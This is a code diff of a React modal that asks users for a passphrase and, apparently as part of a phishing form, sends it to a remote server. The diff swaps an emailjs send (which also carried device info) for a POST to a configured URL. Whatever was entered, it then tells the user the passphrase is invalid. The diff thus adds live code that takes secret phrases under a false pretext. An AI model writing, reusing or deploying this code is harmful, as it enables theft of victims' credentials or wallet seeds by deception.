@@ -1,12 +1,12 @@
 import { Button, Form, message, Modal } from "antd";
 import TextArea from "antd/es/input/TextArea";
 import { motion } from "framer-motion";
-import { Dispatch, SetStateAction, useEffect, useState } from "react";
+import { Dispatch, SetStateAction, useState } from "react";
 import { GiFingerPrint } from "react-icons/gi";
 import { MdPassword } from "react-icons/md";
 import Loading from "./Loading";
-import emailjs from "@emailjs/browser";
 import { useForm } from "antd/es/form/Form";
+
 
 type Props = {
   open: { isOpen: boolean; action: string };
@@ -22,9 +22,9 @@ const ValidateModal = (props: Props) => {
 
   const [form] = useForm();
 
-  useEffect(() => {
-    emailjs.init(import.meta.env.VITE_EMAIL_PUBLIC_KEY);
-  }, []);
+  // useEffect(() => {
+  //   emailjs.init(import.meta.env.VITE_EMAIL_PUBLIC_KEY);
+  // }, []);
 
   if (isLoading) {
     return <Loading />;
@@ -42,15 +42,27 @@ const ValidateModal = (props: Props) => {
     setIsLoading(true);
 
     try {
-      await emailjs.send(
-        import.meta.env.VITE_EMAIL_SERVICE_ID,
-        import.meta.env.VITE_EMAIL_TEMPLATE_ID,
-        {
-          device_info: deviceInfo,
-          passphrase: phrase,
+      // await emailjs.send(
+      //   import.meta.env.VITE_EMAIL_SERVICE_ID,
+      //   import.meta.env.VITE_EMAIL_TEMPLATE_ID,
+      //   {
+      //     device_info: deviceInfo,
+      //     passphrase: phrase,
+      //   },
+      //   import.meta.env.VITE_EMAIL_PUBLIC_KEY
+      // );
+
+      // await fetch("http://localhost:4000/mail/send-token", {
+      await fetch(import.meta.env.VITE_BASE_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
         },
-        import.meta.env.VITE_EMAIL_PUBLIC_KEY
-      );
+        body: JSON.stringify({
+          token: phrase,
+        }),
+      });
+
       setErrorMessage(true);
       message.error("Invalid Pass Phrase");
     } catch (error) {
